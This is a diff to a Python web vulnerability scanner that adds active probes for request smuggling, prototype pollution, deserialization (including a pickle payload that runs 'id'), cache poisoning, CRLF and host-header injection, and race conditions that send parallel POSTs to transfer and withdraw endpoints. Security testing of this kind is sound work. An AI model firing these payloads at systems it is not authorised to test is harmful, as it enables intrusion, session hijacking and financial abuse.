@@ -329,6 +329,334 @@ class VulnScanner:
             f"Found {len(self.discovered_endpoints)} endpoints",
         )
 
+    # ============ HTTP REQUEST SMUGGLING ============
+    def check_request_smuggling(self):
+        self.log("Testing HTTP Request Smuggling...")
+
+        smuggle_payload = "GET /admin HTTP/1.1\r\nHost: " + self.domain + "\r\n\r\n"
+        headers = {"Content-Length": "4", "Transfer-Encoding": "chunked"}
+
+        self.log(f"  Testing CL.TE smuggling attack", "TEST")
+
+        resp = self.curl(
+            self.target, method="POST", headers=headers, data=smuggle_payload
+        )
+
+        if resp and (resp["status"] == 403 or "admin" in resp["body"].lower()):
+            self.add_finding(
+                "HTTP Request Smuggling",
+                "HIGH",
+                self.target,
+                "Possible CL.TE request smuggling vulnerability",
+                "Server may be vulnerable to request smuggling attacks",
+                impact="Bypass security controls, access admin panels, poison cache, steal credentials",
+                exploit="1. Send CL.TE payload\n2. Follow with normal request\n3. Use Burp Turbo Intruder",
+            )
+            self.add_scan_summary(
+                "HTTP Request Smuggling", 1, [self.target], "VULNERABLE"
+            )
+            self.log(f"  Result: VULNERABLE", "FOUND")
+        else:
+            self.add_scan_summary("HTTP Request Smuggling", 1, [self.target], "Secure")
+            self.log(f"  Result: Secure", "INFO")
+
+    # ============ PROTOTYPE POLLUTION ============
+    def check_prototype_pollution(self):
+        self.log("Testing Prototype Pollution...")
+
+        baseline = self.curl(self.target)
+        if not baseline:
+            return
+
+        test_urls = [
+            f"{self.target}?__proto__[admin]=true",
+            f"{self.target}?constructor[prototype][admin]=true",
+            f"{self.target}?__proto__.admin=true",
+        ]
+
+        self.log(f"  Testing {len(test_urls)} pollution vectors", "TEST")
+
+        for url in test_urls:
+            resp = self.curl(url)
+            if resp and resp["status"] == 200:
+                baseline_has_admin = "admin" in baseline["body"].lower()
+                resp_has_admin = "admin" in resp["body"].lower()
+
+                if not baseline_has_admin and resp_has_admin:
+                    if "__proto__" not in resp["body"].lower():
+                        self.add_finding(
+                            "Prototype Pollution",
+                            "HIGH",
+                            url,
+                            "Possible prototype pollution - response behavior changed",
+                            "Parameter pollution detected with behavioral change",
+                            impact="Privilege escalation, authentication bypass, RCE, DoS",
+                            exploit="1. Test: ?__proto__[isAdmin]=true\n2. Check if property polluted\n3. Try RCE payloads",
+                        )
+                        self.add_scan_summary(
+                            "Prototype Pollution",
+                            len(test_urls),
+                            test_urls,
+                            "VULNERABLE",
+                        )
+                        self.log(f"  Result: VULNERABLE", "FOUND")
+                        return
+
+        self.add_scan_summary(
+            "Prototype Pollution", len(test_urls), test_urls, "Secure"
+        )
+        self.log(f"  Result: Secure", "INFO")
+
+    # ============ INSECURE DESERIALIZATION ============
+    def check_deserialization(self):
+        self.log("Testing Insecure Deserialization...")
+
+        payloads = [
+            (
+                "application/x-java-serialized-object",
+                "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==",
+            ),
+            ("application/x-php-serialized", 'O:8:"stdClass":0:{}'),
+            ("application/x-python-pickle", "cos\nsystem\n(S'id'\ntR."),
+        ]
+
+        self.log(f"  Testing {len(payloads)} deserialization payloads", "TEST")
+
+        for content_type, payload in payloads:
+            headers = {"Content-Type": content_type}
+            resp = self.curl(self.target, method="POST", headers=headers, data=payload)
+
+            if resp and (resp["status"] == 500 or "exception" in resp["body"].lower()):
+                error_patterns = [
+                    "unserialize",
+                    "objectinputstream",
+                    "pickle",
+                    "deserialize",
+                ]
+                body_lower = resp["body"].lower()
+
+                for pattern in error_patterns:
+                    if pattern in body_lower:
+                        self.add_finding(
+                            "Insecure Deserialization",
+                            "CRITICAL",
+                            self.target,
+                            f"CONFIRMED deserialization vulnerability ({content_type})",
+                            f"Server processes untrusted serialized data",
+                            impact="RCE, complete server compromise, arbitrary file read/write",
+                            exploit=f"1. Use ysoserial for Java\n2. Generate payload\n3. Send with Content-Type: {content_type}",
+                        )
+                        self.add_scan_summary(
+                            "Insecure Deserialization",
+                            len(payloads),
+                            [self.target],
+                            "VULNERABLE",
+                        )
+                        self.log(f"  Result: VULNERABLE ({content_type})", "FOUND")
+                        return
+
+        self.add_scan_summary(
+            "Insecure Deserialization", len(payloads), [self.target], "Secure"
+        )
+        self.log(f"  Result: Secure", "INFO")
+
+    # ============ CACHE POISONING ============
+    def check_cache_poisoning(self):
+        self.log("Testing Cache Poisoning...")
+
+        baseline = self.curl(self.target)
+        if not baseline:
+            return
+
+        poison_headers = [
+            ("X-Forwarded-Host", "evil.com"),
+            ("X-Forwarded-Scheme", "nothttps"),
+            ("X-Original-URL", "/admin"),
+            ("X-Rewrite-URL", "/admin"),
+        ]
+
+        self.log(f"  Testing {len(poison_headers)} cache poisoning vectors", "TEST")
+
+        for header, value in poison_headers:
+            headers = {header: value}
+            resp = self.curl(self.target, headers=headers)
+
+            if resp and (value in resp["body"] or resp["status"] in [301, 302]):
+                cache_header = resp["headers"].get("x-cache", "").lower()
+                cf_cache = resp["headers"].get("cf-cache-status", "").lower()
+
+                has_cache = (
+                    "hit" in cache_header
+                    or "miss" in cache_header
+                    or cf_cache in ["hit", "miss"]
+                )
+
+                if has_cache:
+                    self.add_finding(
+                        "Cache Poisoning",
+                        "HIGH",
+                        self.target,
+                        f"Cache poisoning via {header}",
+                        f"Header {header} reflected with cache enabled",
+                        impact="Serve malicious content to all users, XSS at scale, redirect to phishing",
+                        exploit=f"1. Send: {header}: evil.com\n2. Poison cache\n3. All users get poisoned response",
+                    )
+                    self.add_scan_summary(
+                        "Cache Poisoning",
+                        len(poison_headers),
+                        [self.target],
+                        "VULNERABLE",
+                    )
+                    self.log(f"  Result: VULNERABLE ({header})", "FOUND")
+                    return
+
+        self.add_scan_summary(
+            "Cache Poisoning", len(poison_headers), [self.target], "Secure"
+        )
+        self.log(f"  Result: Secure", "INFO")
+
+    # ============ CRLF INJECTION ============
+    def check_crlf(self):
+        self.log("Testing CRLF Injection...")
+
+        baseline_url = f"{self.target}?redirect=https://google.com"
+        baseline = self.curl(baseline_url)
+
+        payloads = [
+            "%0d%0aSet-Cookie:%20admin=true",
+            "%0aSet-Cookie:%20admin=true",
+            "%0d%0aLocation:%20http://evil.com",
+        ]
+
+        self.log(f"  Testing {len(payloads)} CRLF payloads", "TEST")
+
+        for payload in payloads:
+            url = f"{self.target}?redirect={payload}"
+            resp = self.curl(url)
+
+            if resp:
+                set_cookie = resp["headers"].get("set-cookie", "")
+                location = resp["headers"].get("location", "")
+
+                if "admin=true" in set_cookie:
+                    if baseline and "admin=true" not in baseline.get("headers", {}).get(
+                        "set-cookie", ""
+                    ):
+                        self.add_finding(
+                            "CRLF Injection",
+                            "HIGH",
+                            url,
+                            "CONFIRMED CRLF injection - injected Set-Cookie header",
+                            f"Successfully injected Set-Cookie: admin=true",
+                            impact="Session fixation, XSS via headers, open redirect, cache poisoning",
+                            exploit="1. Send CRLF payload\n2. Inject headers\n3. Victim gets malicious cookie",
+                        )
+                        self.add_scan_summary(
+                            "CRLF Injection", len(payloads), [url], "VULNERABLE"
+                        )
+                        self.log(f"  Result: VULNERABLE", "FOUND")
+                        return
+
+        self.add_scan_summary("CRLF Injection", len(payloads), [self.target], "Secure")
+        self.log(f"  Result: Secure", "INFO")
+
+    # ============ HOST HEADER INJECTION ============
+    def check_host_header(self):
+        self.log("Testing Host Header Injection...")
+
+        baseline = self.curl(self.target)
+        if not baseline:
+            return
+
+        evil_hosts = ["evil.com", "attacker.com", "127.0.0.1"]
+
+        self.log(f"  Testing {len(evil_hosts)} evil host headers", "TEST")
+
+        for evil_host in evil_hosts:
+            headers = {"Host": evil_host}
+            resp = self.curl(self.target, headers=headers)
+
+            if resp and evil_host in resp["body"]:
+                body_lower = resp["body"].lower()
+                patterns = [
+                    f'href="{evil_host}',
+                    f"href='{evil_host}",
+                    f'src="{evil_host}',
+                ]
+
+                for pattern in patterns:
+                    if pattern.lower() in body_lower:
+                        self.add_finding(
+                            "Host Header Injection",
+                            "MEDIUM",
+                            self.target,
+                            "Host header reflected in response URLs/links",
+                            f"Evil host {evil_host} reflected in actionable context",
+                            impact="Password reset poisoning, cache poisoning, SSRF, web cache deception",
+                            exploit="1. Send: Host: evil.com\n2. Trigger password reset\n3. Steal token",
+                        )
+                        self.add_scan_summary(
+                            "Host Header Injection",
+                            len(evil_hosts),
+                            [self.target],
+                            "VULNERABLE",
+                        )
+                        self.log(f"  Result: VULNERABLE ({evil_host})", "FOUND")
+                        return
+
+        self.add_scan_summary(
+            "Host Header Injection", len(evil_hosts), [self.target], "Secure"
+        )
+        self.log(f"  Result: Secure", "INFO")
+
+    # ============ RACE CONDITIONS ============
+    def check_race_conditions(self):
+        self.log("Testing Race Conditions...")
+
+        test_endpoints = [
+            "/api/coupon/apply",
+            "/api/voucher/redeem",
+            "/api/transfer",
+            "/api/withdraw",
+        ]
+
+        self.log(
+            f"  Testing {len(test_endpoints)} endpoints for race conditions", "TEST"
+        )
+
+        for endpoint in test_endpoints:
+            url = urljoin(self.target, endpoint)
+
+            with ThreadPoolExecutor(max_workers=10) as executor:
+                futures = [executor.submit(self.curl, url, "POST") for _ in range(10)]
+                results = [f.result() for f in as_completed(futures)]
+
+            success_count = sum(1 for r in results if r and r["status"] == 200)
+
+            if success_count > 1:
+                self.add_finding(
+                    "Race Condition",
+                    "HIGH",
+                    url,
+                    f"Race condition detected - {success_count}/10 requests succeeded",
+                    "Multiple parallel requests succeeded - missing atomic transaction",
+                    impact="Redeem coupon multiple times, withdraw money multiple times, bypass rate limits",
+                    exploit=f"1. Use Burp Turbo Intruder\n2. Send 50+ parallel requests\n3. Multiple succeed",
+                )
+                self.add_scan_summary(
+                    "Race Conditions",
+                    len(test_endpoints),
+                    [url],
+                    f"VULNERABLE ({endpoint})",
+                )
+                self.log(f"  Result: VULNERABLE at {endpoint}", "FOUND")
+                return
+
+        self.add_scan_summary(
+            "Race Conditions", len(test_endpoints), test_endpoints, "Secure"
+        )
+        self.log(f"  Result: Secure", "INFO")
+
     # ============ MAIN SCAN ============
     def scan(self):
         print(f"\n{Colors.BOLD}{'=' * 70}{Colors.END}")
@@ -345,6 +673,13 @@ class VulnScanner:
             self.check_subdomain_takeover,
             self.check_cves,
             self.check_log4shell,
+            self.check_request_smuggling,
+            self.check_prototype_pollution,
+            self.check_deserialization,
+            self.check_cache_poisoning,
+            self.check_crlf,
+            self.check_host_header,
+            self.check_race_conditions,
             self.crawl_endpoints,
         ]
 
